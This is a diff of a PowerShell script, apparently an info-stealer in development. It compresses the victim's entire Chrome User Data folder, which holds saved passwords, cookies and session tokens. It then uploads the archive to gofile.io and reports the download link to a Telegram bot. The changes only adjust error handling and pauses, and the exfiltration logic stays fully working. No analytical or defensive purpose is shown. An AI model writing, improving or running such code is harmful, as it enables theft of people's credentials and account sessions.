@@ -53,7 +53,7 @@ function Upload-FileAndGetLink {
     $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
     if ($serverResponse.status -ne "ok") {
         Write-Host "Failed to get server URL: $($serverResponse.status)"
-        cmd /c 'pause'
+        return $null
     }
 
     # Define the upload URI
@@ -79,12 +79,12 @@ function Upload-FileAndGetLink {
         $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
         if ($response.status -ne "ok") {
             Write-Host "Failed to upload file: $($response.status)"
-            cmd /c 'pause'
+            return $null
         }
         return $response.data.downloadPage
     } catch {
         Write-Host "Failed to upload file: $_"
-        cmd /c 'pause'
+        return $null
     }
 }
 
@@ -99,21 +99,27 @@ if (-not (Test-Path $zipExePath)) {
 $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 if (-not (Test-Path $chromePath)) {
     Send-TelegramMessage -message "Chrome User Data path not found!"
-    cmd /c 'pause'
+    Write-Error "An error occurred: $_"
+    Write-Host "Press any key to continue ..."
+    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
 
-# cmd /c 'pause' if 7zip path not found
+# Exit if 7zip path not found
 if (-not (Test-Path $zipExePath)) {
     Send-TelegramMessage -message "7Zip path not found!"
-    cmd /c 'pause'
+    Write-Error "An error occurred: $_"
+    Write-Host "Press any key to continue ..."
+    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
 
 # Create a zip of the Chrome User Data
 $outputZip = "$env:TEMP\chrome_data.zip"
 & $zipExePath a -r $outputZip $chromePath
-if ($LASTcmd /c 'pause'CODE -ne 0) {
+if ($LASTEXITCODE -ne 0) {
     Send-TelegramMessage -message "Error creating zip file with 7-Zip"
-    cmd /c 'pause'
+    Write-Error "An error occurred: $_"
+    Write-Host "Press any key to continue ..."
+    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
 
 # Upload the file and get the link
@@ -122,11 +128,14 @@ $link = Upload-FileAndGetLink -filePath $outputZip
 # Check if the upload was successful and send the link via Telegram
 if ($link -ne $null) {
     Send-TelegramMessage -message "Download link: $link"
-    cmd /c 'pause'
+    Write-Error "An error occurred: $_"
+    Write-Host "Press any key to continue ..."
+    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 } else {
     Send-TelegramMessage -message "Failed to upload file to gofile.io"
-    cmd /c 'pause'
+    Write-Error "An error occurred: $_"
+    Write-Host "Press any key to continue ..."
+    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
-cmd /c 'pause'
 # Remove the zip file after uploading
 Remove-Item $outputZip
